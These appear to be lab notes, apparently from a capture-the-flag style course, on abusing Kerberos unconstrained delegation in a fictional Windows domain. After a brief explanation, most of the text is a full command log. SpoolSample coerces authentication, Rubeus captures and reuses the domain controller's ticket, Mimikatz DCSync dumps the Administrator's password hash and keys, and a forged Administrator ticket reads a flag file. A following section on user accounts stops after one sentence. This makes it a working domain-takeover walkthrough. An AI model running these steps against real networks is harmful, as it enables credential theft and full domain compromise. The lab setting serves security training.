## Unconstrainder Delegation - Computers

Unconstrained delegation was the only type of delegation available in Windows 2000. If a user requests a service ticket on a 
server with unconstrained delegation enabled, the user's Ticket Granting Ticket (TGT) is embedded into the service ticket that
is then presented to the server

The server can cache this ticket in memory and then pretend to be that user for subsequent resource requests in the domain.
If unconstrained delegation is not enabled, only the user's ticket Granting Service (TGS) ticket will be stored in memory. In this
case, if the machine is compromised, an attacker could only access the resource specified in the TGS ticket in that user's
context



### Vector Attack


```
C:\Windows\system32>cd c:\Tools

c:\Tools>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Tools> .\SpoolSample.exe dc01.inlanefreight.local sql01.inlanefreight.local
[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
TargetServer: \\dc01.inlanefreight.local, CaptureServer: \\sql01.inlanefreight.local
Attempted printer notification and received an invalid handle. The coerced authentication probably worked!
PS C:\Tools> .\Rubeus.exe monitor /interval:5 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: TGT Monitoring
[*] Monitoring every 5 seconds for new TGTs


<snip code>

[*] 9/4/2024 2:16:22 PM UTC - Found new TGT:

  User                  :  DC01$@INLANEFREIGHT.LOCAL
  StartTime             :  9/4/2024 9:08:10 AM
  EndTime               :  9/4/2024 7:08:10 PM
  RenewTill             :  9/11/2024 9:08:10 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIF3jCCBdqgAwIBBaEDAgEWooIE0TCCBM1hggTJMIIExaADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggR7MIIEd6ADAgESoQMCAQKiggRpBIIEZQgGtVCy60mTV4s2SCBGK5HUHQIN5flDGXBDFmcTzOd5C6Pscv67H68PHMpgQIEu3m3G55446Omqq92MZp+ptbXh89Yw1gsUqg12Ct7oLoysR2qCABzsvJ2XVlHK1xcwW8nL2E/oTQXk3lF8Nu/NWXBOSD46jKf/Fsjxk0wd6nzr27xLcFonLqvt+qQKk3u4DGJ7qPqtWZVBL27OoTaFSGKoQw8NH4+B9rdHjgCknT6flEfw879+c3S3jm5qsfX+oSZx4FYo1gRxKTKsD21hydMlKWOqtVUpPO+IIjwH8TB1T5qWBTtM43qLt7cwXWxNtYVMhMHkphzcKKugZU4QSuEVCk/XYY/NVmhgSvbK8C4APRVW8OKmpoXC9lEJLOKhjGjKlDeEJMdmw5iuIN3qZ2DgCKdcpFvg29XW9tjGIN4Wg8QTAKDQ95acwJMzZicChIPopw+MQB2aVfc1qJxTXK+eiB0VJcjTpdWkzjNb2H00y5SnAWmf7sJLXnFx8UcCbszEKL6ndws+BjesO5/6FQFFXWep5VkBuUI2vSCEAAaCwD4DlbG3Jgp90uIFaI8GEG+ovsXpn8kdFiuVZFGhwptoMGqcCpYArZ+6cEMWXDaWeQpwYLrr1fcuJYBkqZ3ui8j/y8hNgoX14QCDAhF7ZJo1+/e06tb3kNdCnP1cuMbrZM2EFi/f05/JB8wv+gQWxRH7fiUNsKy0V7ZB770LetRizIQx0LZB9TcBb7oJ7HoR+MW2IZXtW43fSJNqPwOQJ6TriUZ48KUlPn+BoAStuKFb7kHGRs2l9ph0Z9jiKRWXiJ1Q3X0dhBa0/c/n9/r1+lFdK2Ge/as9GmVITilblDEA6py3Q13Mvzmi9tRKYDwgErJ7oxf7TBnIeXraU1rTFNmDDB5VlcAXkSUfP1/dXww77EBHyc82FsjOcf9+UpxwA364aneKfRAHLG3JyMU2BUHLg0aedZcKHpfqa0JkeG3tC4Sr81z0Cro82fg80TFnBiwPX2chNK+Csaidx/xLEwhbyZhjvV5VyRp0mrs6SzNWW/8DA5Sd3uYaCskCjyXN5qNtDb863zbO0qmStEJP6XarCSA2/ud0yKADe9eS7Ck2HZzHrIrEGeP17pWOqyPQEHTFaeuOX1P69oE7qH14z7YrkLVZQPx3fUBGd5CSsiwFZfOWaFG5aJX7PNuEjA2sF57is2STdGsxylLMvq98cqNHs6Xy0Ljqr5ZuFAZmomdIunv12hbkbDdNWXCLGDNl/eoxi/JSkVhF/MZu7zhcWtXy9uIZmLdmBGlRc95R2e10QfpJas7LYFoDPWa5nLceFtHeqaa+hbkA/1raIc+w+vhU9hLppAcmtDbUBvFaFz3SAaoAoQ2oQmGCR3R9riUMrnc8HCnaXxh8IsXq7t4wzbaNO4ac1axkwHUul1vcGJFKyng+5hcOnJ9XGtomaLag2oWRvPjZphow26AJewvJVXv7q05wkBY3XqpBz7WArEWYxf/WVKOB+DCB9aADAgEAooHtBIHqfYHnMIHkoIHhMIHeMIHboCswKaADAgESoSIEIGgIagXXIulhoL56WQ22Z7N4J4rWqLntdkTgzYABflSfoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI0MDkwNDE0MDgxMFqmERgPMjAyNDA5MDUwMDA4MTBapxEYDzIwMjQwOTExMTQwODEwWqgVGxNJTkxBTkVGUkVJR0hULkxPQ0FMqSgwJqADAgECoR8wHRsGa3JidGd0GxNJTkxBTkVGUkVJR0hULkxPQ0FM

PS C:\Tools> .\Rubeus.exe renew /ticket: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 /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: Renew Ticket

[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
[*] Building TGS-REQ renewal for: 'INLANEFREIGHT.LOCAL\DC01$'
[+] TGT renewal request successful!
[*] base64(ticket.kirbi):

      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
      LkxPQ0FM
[+] Ticket successfully imported!
PS C:\Tools> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /user:Administrator
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 10/19/2022 3:42:15 AM
Object Security ID   : S-1-5-21-1870146311-1183348186-593267556-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: a83b750679b1789e29e966d06c7e41f7

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : c0c314620e831f51d2e70c8bbcf467d0

* Primary:Kerberos-Newer-Keys *
    Default Salt : INLANEFREIGHT.LOCALAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 63c66123844eb389d84ba45ce22a1049616c9575ba1db00ee7296f756f5efd83
      aes128_hmac       (4096) : 14dcfebbfdff3600c11212b2fdbcfbee
      des_cbc_md5       (4096) : 51f1a19b4ace5b98
    OldCredentials
      aes256_hmac       (4096) : c061ecce3c5065cb8fa5a318f87043fcda393e5847cd60c5b577c792abe4b1cf
      aes128_hmac       (4096) : cae406f8ce064461c3d052bee571b22a
      des_cbc_md5       (4096) : dce90843451cd5d9
    OlderCredentials
      aes256_hmac       (4096) : a394ab9b7c712a9e0f3edb58404f9cf086132d29ab5b796d937b197862331b07
      aes128_hmac       (4096) : 7630dab9bdaeebf9b4aa6c595347a0cc
      des_cbc_md5       (4096) : 9876615285c2766e

* Primary:Kerberos *
    Default Salt : INLANEFREIGHT.LOCALAdministrator
    Credentials
      des_cbc_md5       : 51f1a19b4ace5b98
    OldCredentials
      des_cbc_md5       : dce90843451cd5d9

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  ab2fdc53a990e32869e8a98fc59dc206
    02  3abca29569facfbc205683459eaece35
    03  0e0679aecd5273af2e68d8b323aae976
    04  ab2fdc53a990e32869e8a98fc59dc206
    05  c9919f1a836e7fabb18d130cec24807c
    06  7b73d306501805583d681b925182046c
    07  f1ccbd2394180bc5c5802995f6ba6a69
    08  b08fc537753c5101f20b63165e280005
    09  45986e33d4f21254afb5f7e87a39cd8d
    10  1e102037b067dc87394511c8a3064383
    11  b08fc537753c5101f20b63165e280005
    12  dd78ee60caa7509ef912b5aae361f3e4
    13  69577b907120d00bebd4b75dfda7991d
    14  914f9c2c97f766342099756e0c1a1630
    15  08e335a746497008039494a75c4ed639
    16  da981c56ea848ac4776321d17e51cc44
    17  e2a7bb20c06e2d632a8c87d6c642ad13
    18  077e3aecbdbb74250de005297bcad363
    19  625cf00ec72be3a3ee550babc6c01ad4
    20  48ef0f03bbcce15c6038a8f70c294f5a
    21  50ef9d684511c75a6e4dffae3b3ccb6c
    22  e5bd6515c85eea79aea14180e9c1c874
    23  040a88fc1e0241e581efc2fa7905a277
    24  694b699679cc1b5fb29f8d94c80e3081
    25  e36606074f573fb29d38e9fca76aed42
    26  6f7d7d09a921775625b065070e5ffd06
    27  2e94f912d99837fdbfa8fbab930636ff
    28  693252322e42b9cc9fec8a962d351f54
    29  1e14b5ecaacafdb74ac49712c20c8da5


mimikatz #
mimikatz #
PS C:\Tools> .\Rubeus.exe asktgt /rc4:a83b750679b1789e29e966d06c7e41f7 /user:Administrator /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: Ask TGT

[*] Using rc4_hmac hash: a83b750679b1789e29e966d06c7e41f7
[*] Building AS-REQ (w/ preauth) for: 'INLANEFREIGHT.LOCAL\Administrator'
[*] Using domain controller: 172.16.99.3:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGFjCCBhKgAwIBBaEDAgEWooIFETCCBQ1hggUJMIIFBaADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
      QUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggS7MIIEt6ADAgESoQMC
      AQKiggSpBIIEpVpBLEu95w7GhjTt+fAURjed5edGzVZ309n+CkryrJvEKGr/PM7zjwKu5FSKMYPi/6h5
      Duk6fnzhBxngY+0UT0hGapguI49dDj8wT2wto3iBAGS+thQtz7bXAfT/rvwdZdJFYiY0Z+U+fbrfsNeY
      IN4eSdqx1NaFH9+J8Qz2BFvXJ8cvb3HdwVhK0RAec+bLyen2jwM9/gjmW65lI1lHsAGN6My3Jj/vm6Gq
      GFUyNnBKY7CkPvPj+4lMGke6HBVbJBO9oQOUqNUQ7l2ttk4Rxy9E309zStGPYTEs0QIDpC2kQGjXH6hI
      vE29vifuXO+aea1vdJAc04jWSEzoItJniWFc9qY6Wa0sBMVEHQoMbXYxqXspE6cWn9bi90yZ5+IxUrBo
      C8NRRgTfh3jxlDWhP5h9TR0TfPua+OeICa8O3z8lq9KV2hB+pzxRku9IoZyzTAbs1NMceQHA0X73zlVg
      yUXkXQ2g2fzS0sq6mGr8tI90kYbR9FknZbv7NweABVcgB7ComkZaHqacc+jLZRT0syB3yaEHEYFOSbzV
      nvcuSweuXpLx84VBll40j6qDeOoytUnhxNm5tXfqVS2zMVG5H/DjFLDbeeAEHK9TiAJKB04s12+wqqcO
      KvH/PHmgoEqj5MWzEPfQ0o//iaXRxkSh+TMQpU7PWsSN9rv23q6u52i5gt+k7H6FW+G+e1jXzj1b5446
      w81y8ufqaLPGXhxk3T4ndoyuNW0IKhhMjql81ZbGg+YPigJ4zEB8zGcgzRMSo/r8KGXA4kvO81RFnddP
      YZiuX/u0GkthFCjphge6Z0CyczEL2C5VRle/jV5djJk2RdQulNP5rve0DMOFmlNLwsDIcm2K0x1emJXE
      C8gutnWeLtZVWyD0hIlDwSe6faUae8rWfieRwlR1PeS3rokBHPSZerZD/A8t7ZU4bD95WQTtIm97GBw5
      LIIjyxCL2ZtwPQYifGEGz9QsiQ36EcqS2F5fJPqc1rdHMvDBMUdvuGhSUecfD3poNcAlFtKNaZLw4Un7
      iAVpsbdW9Z3Gt+WL8nVdTZIHdLElrp5HPUpAEviAc/tIVXkInG1+fiy00jqrhVXhDjVr4UYRhVyhoMK0
      b0FeLaFH43Pj/5a7U/QbkLs420bUrd0od5p3zcfTyDvv6AoNS6uyFFhSk23HdHX/5qiSnyLHm5KJoX3U
      SjjMKbvbVqlDR1A+8QglLw+J84ggQCqWBKb/ZdV+UraoGk9IKxWpNSmFBf0FwaxiHFUfB6x5GPKc/AQG
      kzK2fmrjIUov1+7+qjgO/1kng0IJEW6EiaGQViwB0A2ovDnPQgFZ8WSaa0AcTjOKydKrXrxypvDr3NhQ
      TCpuDKz+1EJnafrACb4EzBQg3Tbt9xipnaI0oo4nvHjREhyZp875T7HFWzNp5bPeB+ZfBEQzHFksLRfv
      z3clqMidadBymnrmM7HVhzO5LBHBnQyXlWsFYrT1zLwRQUdTcKnETz0S4r2kg6OQ4FKgnZM7zH8tpbEP
      4jQ4yRUr+DbBKeq3viipJJybG9duk9FlPqOx/fMQEWC1T6MMTRvk1WQVJ975KUKPWO3vA7+2/Tp1T2Gj
      gfAwge2gAwIBAKKB5QSB4n2B3zCB3KCB2TCB1jCB06AbMBmgAwIBF6ESBBDNT3iM1Ef53aDflHZdnF9B
      oRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiGjAYoAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAA
      pREYDzIwMjQwOTA0MTQyMjUyWqYRGA8yMDI0MDkwNTAwMjI1MlqnERgPMjAyNDA5MTExNDIyNTJaqBUb
      E0lOTEFORUZSRUlHSFQuTE9DQUypKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9D
      QUw=
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/INLANEFREIGHT.LOCAL
  ServiceRealm             :  INLANEFREIGHT.LOCAL
  UserName                 :  Administrator
  UserRealm                :  INLANEFREIGHT.LOCAL
  StartTime                :  9/4/2024 9:22:52 AM
  EndTime                  :  9/4/2024 7:22:52 PM
  RenewTill                :  9/11/2024 9:22:52 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  zU94jNRH+d2g35R2XZxfQQ==
  ASREP (key)              :  A83B750679B1789E29E966D06C7E41F7

PS C:\Tools> Get-Content \\DC01\C$\Unconstrained\flag.txt
```


## Unconstrained Delegation - Users

Users in Active Directory can also configured for unconstrained delegation, and it's quite different to exploit. To get a list of 
user accounts with this flag set, we can use the PowerView fucntion Get-DomainUser with a specific LDAP filter that will look
for user with teh TRUSTED_FOR_DELEGATION flag set in their UAC











